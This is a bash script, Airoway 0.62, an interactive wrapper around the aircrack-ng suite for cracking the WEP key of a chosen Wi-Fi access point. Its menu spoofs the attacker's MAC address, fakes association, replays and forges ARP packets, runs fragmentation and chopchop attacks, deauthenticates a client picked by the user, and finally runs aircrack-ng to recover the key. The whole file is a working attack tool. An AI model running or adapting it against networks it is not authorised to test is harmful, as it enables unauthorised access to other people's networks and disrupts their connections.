#! /bin/bash
# Airoway 0.62 (June 30th 2007)
# Developed by Divide for Wifiway
# Modified by Rusty73 for Seguridadwireless, compatible with Ubuntu 9.10 and 10.04
# and with Intel and Atheros cards
# Thanks to Daouid, Hadrianweb, and SeguridadWireless team !

#set theses 2 variables according to your hardware

LISTEN="mon0"
INJECT="mon0"

###########################

AUTOCLOSETERMINAL=0

###########################
###########################

VER="0.62"

TOPR='-hold -title Airoway_Scan_[CTRL][C]_to_stop -geometry 92x28+456+0 -fs 8 -bg #000000 -fg #00FF00'
BOTR='-hold -title Airoway_Attack_[CTRL][C]_to_stop -geometry 92x24+456+394 -fs 8 -bg #000000 -fg #FF0000'

TOPL='-hold -title Airoway_Command_[CTRL][C]_to_quit -geometry 74x24+0+0 -fs 8 -bg #000000 -fg #FFFFFF'
MIDL='-hold -title Airoway_Attack_[CTRL][C]_to_stop -geometry 74x13+0+340 -fs 8 -bg #000000 -fg #FFFF00'
BOTL='-hold -title Airoway_Attack_[CTRL][C]_to_stop -geometry 74x13+0+537 -fs 8 -bg #000000 -fg #FFFF00'

POPUPTOP='-title Airoway_Fragmentation_[CTRL][C]_to_stop -geometry 74x20+330+102 -fs 8 -bg #000000 -fg #FFFF00'
POPUPBOT='-title Airoway_ChopChop_[CTRL][C]_to_stop -geometry 74x20+330+390 -fs 8 -bg #000000 -fg #FFFF00'

RET=$'\n'
ESC=$'\e'
LEFT=$'[D'
RIGHT=$'[C'
#LEFT=$'\x1b[D'
#RIGHT=$'\x1b[C'



if [ `ls -1 -t /sys/class/net/$LISTEN | head -n 1` -a `ls -1 -t /sys/class/net/$INJECT | head -n 1` ]
then
	echo -n ""
else
	clear
	echo "You must edit airoway.sh with your wifi interfaces"
	exit
fi



_key()
{
	IFS= read -r -s -n1 -d '' "${@:-_KEY}"
	if [ "$_KEY" = "$ESC" ]
	then
		IFS= read -r -s -n2 -d '' -t1 "${@:-_KEY}"
	fi	
}

function Num2Char() {
conv=""
case $1
in
	0) conv="0";;
	1) conv="1";;
	2) conv="2";;
	3) conv="3";;
	4) conv="4";;
	5) conv="5";;
	6) conv="6";;
	7) conv="7";;
	8) conv="8";;
	9) conv="9";;
	10) conv="a";;
	11) conv="b";;
	12) conv="c";;
	13) conv="d";;
	14) conv="e";;
	15) conv="f";;
	16) conv="g";;
	17) conv="h";;
	18) conv="i";;
	19) conv="j";;
	20) conv="k";;
	21) conv="l";;
	22) conv="m";;
	23) conv="n";;
	24) conv="o";;
	25) conv="p";;
	26) conv="q";;
	27) conv="r";;
	28) conv="s";;
	29) conv="t";;
	30) conv="u";;
	31) conv="v";;
esac
}

function Char2Num() {
conv=""
case $1
in
	0) conv="0";;
	1) conv="1";;
	2) conv="2";;
	3) conv="3";;
	4) conv="4";;
	5) conv="5";;
	6) conv="6";;
	7) conv="7";;
	8) conv="8";;
	9) conv="9";;
	a) conv="10";;
	b) conv="11";;
	c) conv="12";;
	d) conv="13";;
	e) conv="14";;
	f) conv="15";;
	g) conv="16";;
	h) conv="17";;
	i) conv="18";;
	j) conv="19";;
	k) conv="20";;
	l) conv="21";;
	m) conv="22";;
	n) conv="23";;
	o) conv="24";;
	p) conv="25";;
	q) conv="26";;
	r) conv="27";;
	s) conv="28";;
	t) conv="29";;
	u) conv="30";;
	v) conv="31";;
esac
}

# From AiroScript (modified version)
function Parseforap {
ap_array=`cat airowaydump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
head -n $ap_array airowaydump-01.csv &> airowaydump-02.txt
clear
echo "---Airoway $VER---"
echo ""
i=0
echo -e "["$i"] BACK to channels scan"
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
 longueur=${#MAC}
   if [ $longueur -ge 17 ]; then
    i=$(($i+1))
    
    Num2Char $i
    
    
    
    echo -e "["$conv"] $MAC $PRIVACY $CHANNEL $ESSID"
    aidlenght=$IDLENGTH
    assid[$i]=$ESSID
    achannel[$i]=$CHANNEL
    amac[$i]=$MAC
    aprivacy[$i]=$PRIVACY
   fi
done < airowaydump-02.txt
conv=""
while [ "$conv" = "" ]
do
	_key
	Char2Num $_KEY
done

idlenght=${aidlenght[$conv]}
ssid=${assid[$conv]}
acouper=${#ssid}
fin=$(($acouper-idlength))
essid=${ssid:1:fin}

channel=${achannel[$conv]}
bssid=${amac[$conv]}

}


if [ "$1" = "com" ]
then
	echo "" >/var/tmp/$2com
	echo "999999999" >/var/tmp/$2compid
	trap 'kill $compid 2>/dev/null' 2
	while [ 1 ]
	do
		sleep 0.1
		read com </var/tmp/$2com
		read compid  </var/tmp/$2compid
		if [ "$com" != "" ]
		then
			if [ `ps -p $compid -o pid | grep -v PID` ]
			then
				kill $compid
			else
				clear
				if [ "$2" = "topr" ]
				then
					`$com` & #prevent a display bug with airodump-ng
					compid=$!
					compid=$[$compid+1]
					#compid = $(ps ax | grep airodump-ng | awk '/airowaydump/ {print $1}')
					#compid = $!

				else				
					eval "$com &"
					compid=$!
				fi
				echo $compid >/var/tmp/$2compid
				echo "" >/var/tmp/$2com
			fi
		fi
	done
elif [ "$1" = "scan" ]
then

trap 'ifconfig $INJECT down; read hmac </var/tmp/hmac; macchanger $INJECT -m $hmac; ifconfig $INJECT up; killall xterm' 2
read hmac </sys/class/net/$INJECT/device/net/$INJECT/address
channel=1
while [ 1 ]
do
	clear
	echo "---Airoway $VER---"
	echo ""
	rm airowaydump*  2>/dev/null
	rm *.cap  2>/dev/null
	rm *.xor  2>/dev/null
	#read channel </sys/class/net/$INJECT/device/channel
	echo "airodump-ng -c $channel -w airowaydump $LISTEN" >/var/tmp/toprcom
	#echo "aireplay-ng -9 $INJECT" >/var/tmp/botrcom

	echo "Scanning channel $channel..."
	echo "[LEFT] or [RIGHT] to change channel"
	echo "[1][2][3][4][5][6][7][8][9][a][b][c][d][e] to jump to a channel"
	echo "[ENTER] to start cracking an access point"
	_key

	if [ "$_KEY" = "$RIGHT" ]
	then
		channel=$[$channel+1]
	fi
	if [ "$_KEY" = "$LEFT" ]
	then
		channel=$[$channel-1]
	fi
	Char2Num $_KEY
	if [ "$conv" != "" ]
	then
		channel=$conv
	fi
	if [ "$_KEY" = "$RET" ]
	then
		echo "Parsing..."
		#read toprcompid </var/tmp/toprcompid
		#toprcompid = $(ps ax | grep airodump-ng | awk '/airowaydump/ {print $1}')
		#toprcompid=`ps ax | grep airodump-ng | awk '/airowaydump/ {print $1}'`
		#kill $toprcompid
		#kill $[$toprcompid+1]
		read botrcompid </var/tmp/botrcompid
		kill $botrcompid
		sleep 2
		
		Parseforap
		if [ "$conv" == "0" ]
		then
			channel=1
		fi
		if [ "$conv" != "0" ]
		then

		#ifconfig $INJECT down 
		iwconfig $INJECT channel $channel
		#echo $channel >/sys/class/net/$INJECT/device/channel
		#chmod u+wrx /sys/class/net/$INJECT/device/rate
		#echo 4 >/sys/class/net/$INJECT/device/rate
		#echo $bssid >/sys/class/net/$INJECT/device/bssid
		#ifconfig $INJECT up
		toprcompid=`ps ax | grep airodump-ng | awk '/airowaydump/ {print $1}'`
		kill $toprcompid
		
		rm airowaydump*
		echo "airodump-ng -c $channel --bssid $bssid -w airowaydump $LISTEN" >/var/tmp/toprcom
		#echo "aireplay-ng -9 -e '$essid' -a $bssid $INJECT" >/var/tmp/botrcom
		
		cracking=1
		while [ "$cracking" = "1" ]
		do										
			clear
			echo "---Airoway $VER---"
			echo ""
			echo "Access point: $bssid ($essid)"
			echo "My MAC: $hmac"
			echo ""
			echo "[0] BACK to channels scan"
			echo "[1] CHANGE my MAC (will stop all attacks)"
			echo "[2] ASSOCIATE (don't if you already use an associated MAC)"
			echo "[3] REPLAY live ARPs (boost traffic if ARPs are detected)"
			echo "[4] DISCONNECT an associated client (generate ARPs on reconnection)"
			echo "[5] COLLECT datas to generate offline ARP or for special associations"
			echo "[6] GENERATE an offline ARP from collected datas"
			echo "[7] REPLAY last ARPs (generated or from previous live session)"
			echo "[8] CRACK key (wait for enough packets before doing this)"
			echo ""
			_key
			if [ "$_KEY" = "0" ] # back to scan
			then
				#read toprcompid </var/tmp/toprcompid
				toprcompid=`ps ax | grep airodump-ng | awk '/airowaydump/ {print $1}'`
				kill $toprcompid
				#kill $[$toprcompid+1]
				read botrcompid </var/tmp/botrcompid
				kill $botrcompid
				echo "clear" >/var/tmp/botrcom
				read midlcompid </var/tmp/midlcompid
				kill $midlcompid
				echo "clear" >/var/tmp/midlcom
				read botlcompid </var/tmp/botlcompid
				kill $botlcompid
				echo "clear" >/var/tmp/botlcom
				cracking=0
			fi
			if [ "$_KEY" = "1" ] # change mac
			then
				read originalmac </var/tmp/hmac
				echo "Original MAC: $originalmac"
				echo "Enter new MAC or [ENTER] to abort:"
				echo "(you can select a MAC with your mouse and middle click here to paste it)"
				read hmac
				if [ "$hmac" != "" ]
				then

					#read toprcompid </var/tmp/toprcompid
					toprcompid=`ps ax | grep airodump-ng | awk '/airowaydump/ {print $1}'`
					kill $toprcompid
					#kill $[$toprcompid+1]
					read botrcompid </var/tmp/botrcompid
					kill $botrcompid
					echo "clear" >/var/tmp/botrcom
					read midlcompid </var/tmp/midlcompid
					kill $midlcompid
					echo "clear" >/var/tmp/midlcom
					read botlcompid </var/tmp/botlcompid
					kill $botlcompid
					echo "clear" >/var/tmp/botlcom
													
					ifconfig $INJECT down
					macchanger $INJECT -m $hmac
					ifconfig $INJECT up
				
					echo "airodump-ng -c $channel --bssid $bssid -w airowaydump $LISTEN" >/var/tmp/toprcom
				else
					hmac=$originalmac
				fi
			fi
			if [ "$_KEY" = "2" ] # associate
			then
				read midlcompid </var/tmp/midlcompid
				kill $midlcompid
				if [ `ls -1 -t *.xor | head -n 1` ]
				then			
					echo "aireplay-ng -1 0 -o 1 -e '$essid' -y `ls -1 -t *.xor | head -n 1` -a $bssid -h $hmac $INJECT" >/var/tmp/midlcom
				else
					echo "aireplay-ng -1 0 -o 1 -e '$essid' -a $bssid -h $hmac $INJECT" >/var/tmp/midlcom
				fi
			fi
			if [ "$_KEY" = "3" ] # replay live arp
			then
				read botlcompid </var/tmp/botlcompid
				kill $botlcompid			
				echo "aireplay-ng -3 -b $bssid -h $hmac -x 512 $INJECT" >/var/tmp/botlcom
			fi
			if [ "$_KEY" = "4" ] # disconnect
			then			
				echo "Enter a MAC to disconnect or [ENTER] to abort:"
				echo "(you can select a MAC with your mouse and middle click here to paste it)"
				read cmac
				if [ "$cmac" != "" ]
				then
					aireplay-ng -0 3 -a $bssid -c $cmac $INJECT &
					deauthpid=$!
					sleep 4
					kill deauthpid
				fi
				
			fi
			if [ "$_KEY" = "5" ] # collect datas using fragmentation
			then
			
				xterm $POPUPTOP -e aireplay-ng -5 -b $bssid -h $hmac $INJECT &
				xterm $POPUPBOT -e aireplay-ng -4 -b $bssid -h $hmac $INJECT &
			fi
			if [ "$_KEY" = "6" ] # generate arp
			then
				if [ `ls -1 -t *.xor | head -n 1` ]
				then
					packetforge-ng -0 -a $bssid -h $hmac -k 255.255.255.255 -l 255.255.255.255 -y `ls -1 -t *.xor | head -n 1` -w replay_arp-generated.cap &
					sleep 1
				fi
			fi
			if [ "$_KEY" = "7" ] # replay offline arp
			then
				if [ `ls -1 -t replay_arp*.cap | head -n 1` ]
				then	
					read botlcompid </var/tmp/botlcompid
					kill $botlcompid
					echo "aireplay-ng -3 -b $bssid -h $hmac -x 512 -r `ls -1 -t replay_arp*.cap | head -n 1` $INJECT" >/var/tmp/botlcom
				else
					echo "no offline ARPs available"
					sleep 1
				fi
			fi
			if [ "$_KEY" = "8" ] # crack
			then
				read botrcompid </var/tmp/botrcompid
				kill $botrcompid			
				echo "aircrack-ng -z -b $bssid airowaydump*.cap" >/var/tmp/botrcom
			fi
			
		done
		fi
	fi 

	#read toprcompid </var/tmp/toprcompid
	#kill $toprcompid
	#toprcompid = $(ps ax | grep airodump-ng | awk '/airowaydump/ {print $1}')
	#= $(ps ax | grep airodump-ng | awk '/airowaydump/ {print $1}')
	#`$command`
	toprcompid=`ps ax | grep airodump-ng | awk '/airowaydump/ {print $1}'`
	sleep 2
	#read toprcompid </var/tmp/toprcompid
	#eval $toprcompid
	kill $toprcompid
	read botrcompid </var/tmp/botrcompid
	kill $botrcompid
	sleep 1
	#ifconfig $INJECT down 
	#echo $channel >/sys/class/net/$INJECT/device/channel
	#ifconfig $INJECT up
done
else
	echo -n "Launching Airoway"
	
	read hmac </sys/class/net/$INJECT/device/net/$INJECT/address
	echo $hmac >/var/tmp/hmac
	
	channel=1
	#ifconfig $INJECT down 
	#echo $channel >/sys/class/net/$INJECT/device/channel
	#ifconfig $INJECT up

	xterm $MIDL -e $0 com midl &
	echo $! >/var/tmp/midlpid
	
	xterm $BOTL -e $0 com botl &
	echo $! >/var/tmp/botlpid
	
	xterm $TOPR -e $0 com topr &
	echo $! >/var/tmp/toprpid			
	
	xterm $BOTR -e $0 com botr &
	echo $! >/var/tmp/botrpid			
	
	sleep 0.1
	
	xterm $TOPL -wf -e $0 scan &
	echo $! >/var/tmp/toplpid

	
	if [ "$AUTOCLOSETERMINAL" = "1" ]
	then
		xterm -e killall -KILL Terminal
	fi
	sleep 0.1
	echo -n "."
	sleep 0.1
	echo -n "."
	sleep 0.1
	echo -n "."
	sleep 0.1
	echo -n "."
	sleep 0.1
	echo "."
fi

